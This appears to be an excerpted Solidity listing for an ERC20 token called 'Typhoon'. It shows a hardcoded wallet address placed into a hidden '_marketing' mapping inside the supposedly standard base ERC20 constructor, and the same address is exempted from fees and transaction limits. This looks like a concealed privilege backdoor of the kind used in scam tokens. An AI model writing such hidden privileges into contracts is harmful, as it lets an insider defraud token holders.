...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketing[0x083510319Ff0c8352B4e58d3013298365A66f561] = _marketingwallet;
    }
...
contract Typhoon is ERC20, Ownable {
    ...
    constructor() ERC20("Typhoon", "TYPHOON") {
        ...
        excludeFromFees(address(0x083510319Ff0c8352B4e58d3013298365A66f561), true);
        
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(address(0x083510319Ff0c8352B4e58d3013298365A66f561), true);
